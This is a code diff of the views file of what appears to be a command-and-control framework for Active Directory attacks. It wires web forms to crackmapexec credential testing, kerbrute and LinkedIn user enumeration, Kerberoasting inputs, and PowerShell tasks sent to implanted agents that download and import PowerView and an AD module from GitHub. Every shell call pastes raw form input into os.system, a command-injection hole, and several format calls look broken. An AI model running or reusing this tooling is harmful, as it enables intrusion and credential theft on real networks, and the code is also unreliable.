@@ -17,8 +17,17 @@ tools_path = os.path.normpath(current_path+os.sep+os.pardir)+"/Tools&Scripts"
 # local python server
 # Downloadfile
 
-def linkedin_users(request, agent='' , comp='', linkedin_mail='' , linkedin_password=''):
+def linkedin_users(request):
     if request.method=='POST':   
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
+        agentTask.save()
+        comp = request.POST['comp']
+        linkedin_mail = request.POST['linkedin_mail']
+        linkedin_password = request.POST['linkedin_password']
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
         os.system("echo '===============linkedin_users===============\nOutPut in the following path:\n{result_dir}' >> {result_path};python ../general/linkedin2username/linkedin2username.py -c {comp} -u {linkedin_mail} -p {linkedin_password} -o {result_dir}".format(result_path,comp,linkedin_mail,linkedin_password,result_dir))
@@ -67,8 +76,17 @@ def EnumSMBShares(request):
         return render(request, 'blog/listeners.html')
 
 
-def TestingCreds_onDC(request, agent='' , ip='' , username='', password='' ):
+def TestingCreds_onDC(request):
     if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
+        agentTask.save()
+        ip = request.POST['ip']
+        username = request.POST['username']
+        password = request.POST['password']
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
         os.system("echo '===============Testing Credentials===============' >> {result_path};crackmapexec smb {ip} -u {username} -p {password} >> {result_path}".format(result_path,ip,username,password))
@@ -78,8 +96,17 @@ def TestingCreds_onDC(request, agent='' , ip='' , username='', password='' ):
 
 #enum
 #crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
-def userenum_withcreds(request, agent='' , ip='' , username='', password='' ):
+def userenum_withcreds(request):
     if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
+        agentTask.save()
+        ip = request.POST['ip']
+        username = request.POST['username']
+        password = request.POST['password']
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
         os.system("echo '===============CME Users===============\nOutPut in the following path:\n{result_dir}' >> {result_path};crackmapexec smb {ip} -u {username} -p {password} --users > {result_dir}CMEUsers".format(result_dir,result_path,ip,username,password))
@@ -126,8 +153,15 @@ def Adapter(request):
         return render(request, 'blog/listeners.html')
     
 #enum
-def fbing(request, agent='' , iprange=''):
+def fbing(request):
     if request.method=='POST':
+        agent = request.POST['agent']
+        iprange = request.POST['iprange']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
+        agentTask.save()
         result_path = "../data/listeners/agents/{}/results".format(agent)
         os.system("echo '===============FPING O/P===============' >> {result_path};fping -asgq {iprange} >> {result_path} ".format(iprange,result_path))
     else:
@@ -234,17 +268,17 @@ def DomainUsers(request, domain=''):
         return render(request, 'blog/listeners.html')
 
 
-def DomainControllers(request, domain=''):
+def DomainControllers(request):
     if request.method=='POST':
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
+        domain = request.POST['domain']
         current_user = request.user
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Domain Controllers===============";import-module $env:USERPROFILE\powerview.ps1;get-domaincontroller -domain {};echo "++++++++++++++++++`r`n"'.format(domain)
-        
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -326,7 +360,6 @@ def groupInfo(request):
         group = request.POST['group']
         os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
         task = '(New-Object Net.WebClient).DownloadFileAsync("https://raw.githubusercontent.com/samratashok/ADModule/master/Microsoft.ActiveDirectory.Management.dll", $env:USERPROFILE+"/Microsoft.ActiveDirectory.Management.dll");import-module $env:USERPROFILE\Microsoft.ActiveDirectory.Management.dll;echo "++++++++++++++++++`r`n`t`r`n===============Get-ADGroup===============";Get-ADGroup -Identity "{group}";echo "===============Get-DomainGroupMember===============";Get-ADGroupMember -Identity "{group}";echo "++++++++++++++++++`r`n" '.format(group)
-        
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -806,9 +839,9 @@ def TGStickets_GetSPNusers(request):
         domain = request.POST['domain']
         username = request.POST['username'] #optional
         password = request.POST['password'] #optional
-        username = request.POST['DCip'] #optional
-        aeskey = request.POST['hexkey'] #optional
-        hashes= request.POST['hashes'] #optional
+        #username = request.POST['DCip']    #optional
+        aeskey = request.POST['hexkey']     #optional
+        hashes= request.POST['hashes']      #optional
         agent = request.POST['agent']
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
@@ -888,8 +921,17 @@ def usercommand_history(request):
 
 #enum
 # kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
-def UserEnumwithKerbrute(request, agent='' , domain='', dc_ip='', users_list=''):
+def UserEnumwithKerbrute(request):
     if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        current_user = request.user
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
+        agentTask.save()
+        users_list = request.POST['users_list']
+        dc_ip = request.POST['dc_ip']
+        domain = request.POST['domain']
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
         os.system("echo '===============kerbrute O/P===============\nOutPut in the following path:\n{result_dir}' >> {result_path};./../general/kerbrute_linux_386 userenum -d {domain} --dc {dc_ip} {users_list} | cut -d ':' -f 4 | sed 's/ //g' >> {result_dir}KerpUserEnum ".format(domain,dc_ip,users_list,result_path))
